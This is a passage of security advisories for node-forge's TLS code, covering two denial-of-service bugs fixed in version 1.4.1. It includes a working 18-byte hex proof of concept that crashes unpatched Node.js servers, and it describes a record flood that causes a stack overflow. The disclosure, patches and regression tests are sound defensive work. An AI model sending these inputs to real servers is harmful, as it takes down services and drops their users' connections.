On 1.4.0 (Node.js 24), `process()` throws `RangeError: Maximum call stack size exceeded` after about 2,300 records, before any handshake. The same happens for a client connection. In a Node.js server that calls `c.process(data.toString('binary'))` from `socket.on('data', ...)`, a client sending these 40,000 bytes terminates the server process. On 1.4.1 all records are processed and the server keeps running.

Regression tests in tests/unit/tls.js, "record processing": 50,000 heartbeat records in one call in server and client mode, a handshake message fragmented over 50,000 records, many HelloRequest messages per record, and checks that byte-by-byte input and exceptions from callbacks behave as before.

### Impact

Applications that use node-forge's TLS implementation: connections from `forge.tls.createConnection()`, including those created by `forge.tls.wrapSocket()` and the `forge.http` / `forge.xhr` TLS connections, which call `process()` on received data. Any peer that can connect to a forge TLS server, or any server a forge TLS client connects to, can send a small chunk of records (under 20 KB) without authentication. In Node.js applications using the documented usage, the uncaught exception terminates the process, which drops every connection it serves; repeated chunks keep it down. In browsers the impact is limited to the attacked connection. There is no confidentiality or integrity impact.

- https://github.com/digitalbazaar/forge/security/advisories/GHSA-hqq3-7jhf-c5jx [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-119187 [ADVISORY]
- https://github.com/digitalbazaar/forge/commit/817e2ce0d0f6d8a25bc9c2670615c38a9ffdc51c [WEB]

### GHSA-8hrf-8g6f-7xwp — Forge: Denial of service in TLS record processing via a record interleaved with a fragmented handshake message
- Aliases: CVE-2026-119188 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-248, CWE-476
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/node-forge: introduced:0 fixed:1.4.1

### Summary

A connection created with `forge.tls.createConnection()` throws an uncaught `TypeError` from `process()` when it receives a record of another content type while waiting for the rest of a handshake message that was split across records. A peer can trigger this with 18 bytes before the handshake, without authentication, which terminates Node.js processes that use the documented socket wiring. Fixed in node-forge 1.4.1.

### Details

In `lib/tls.js`, `_readRecord()` handles a record that arrives while a handshake message split across records is incomplete. If the record has any other content type (change_cipher_spec, alert, application_data or heartbeat), forge correctly reports "Invalid fragmented record." through `c.error()` with a fatal `unexpected_message` alert. That fatal error closes and resets the connection, which sets `c.record` to `null`. `_readRecord()` then continues with `c.record.ready = true` and throws `TypeError: Cannot set properties of null (setting 'ready')` out of `process()`. The code is unchanged since the first release.

RFC 5246 section 6.2.1 allows a handshake message to be fragmented across records, and RFC 8446 section 5.1 forbids interleaving handshake messages with other record types. Failing the connection with `unexpected_message` is the intended behavior; the bug is the crash after the error.

node-forge reports TLS protocol errors through the `error` callback, so applications do not normally wrap `process()` in `try`/`catch`. When `process()` is called from a Node.js socket `data` handler, as in the documented usage, the exception is uncaught and terminates the process.

The fix returns from `_readRecord()` right after the fatal error. The connection is failed, the alert is sent and the `error` callback is called as before, and `process()` no longer throws.

### Patches
Fixed in node-forge 1.4.1. The connection still fails with a fatal `unexpected_message` alert and the `error` callback, but `process()` no longer throws.

### Workarounds
Wrap every call to `connection.process()` in `try`/`catch`. The connection has already been failed and closed when the exception is thrown, so the exception can be ignored or the socket destroyed.

### Proof of concept

Input (server mode), two records, 18 bytes:

  16 03 01 00 06 01 00 00 10 03 01   handshake record: ClientHello header announcing 16 bytes, 2 present
  15 03 01 00 02 02 28               alert record

  // c = forge.tls.createConnection({server: true, ...})
  c.process(forge.util.hexToBytes('1603010006010000100301' + '15030100020228'));

On 1.4.0 the `error` callback receives "Invalid fragmented record.", then `process()` throws `TypeError: Cannot set properties of null (setting 'ready')`. A change_cipher_spec, application_data or heartbeat record in place of the alert has the same effect, and a client connection behaves the same with a fragment of a ServerHello. In a Node.js server that calls `c.process(data.toString('binary'))` from `socket.on('data', ...)`, a client sending these 18 bytes terminates the server process. On 1.4.1 the connection fails with a fatal `unexpected_message` alert and `process()` returns normally.

Regression tests in tests/unit/tls.js, "fragmented handshake messages": each of the four other record types after a handshake fragment, in server and client mode, plus same-type continuation records that are still accepted.

### Impact

Applications that use node-forge's TLS implementation: connections from `forge.tls.createConnection()`, including those created by `forge.tls.wrapSocket()` and the `forge.http` / `forge.xhr` TLS connections. Any peer that can connect to a forge TLS server, or any server a forge TLS client connects to, can send 18 bytes before the handshake, without authentication. In Node.js applications using the documented usage, the uncaught exception terminates the process, which drops every connection it serves, and the attacker can repeat it on every restart. There is no confidentiality or integrity impact.
